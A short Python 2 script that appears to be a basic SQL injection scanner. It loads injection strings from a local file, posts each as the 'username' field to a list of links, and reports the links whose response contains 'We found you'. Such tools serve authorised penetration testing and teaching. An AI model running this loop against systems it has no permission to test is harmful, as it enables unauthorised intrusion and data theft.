import requests
import json
from utility import read_links, get_success_message

print 'start sql injection'

commons = 'sql_injection_commons.txt'
f = open(commons, 'r')
injections = f.read().splitlines()

for link in read_links():
    for injection in injections:
        payload = {
            'username': injection
        }
        req = requests.post(link, data=payload)
        if req.content.find('We found you') != -1:
            print get_success_message(link + ' ' + json.dumps(payload))

print 'finish sql injection'
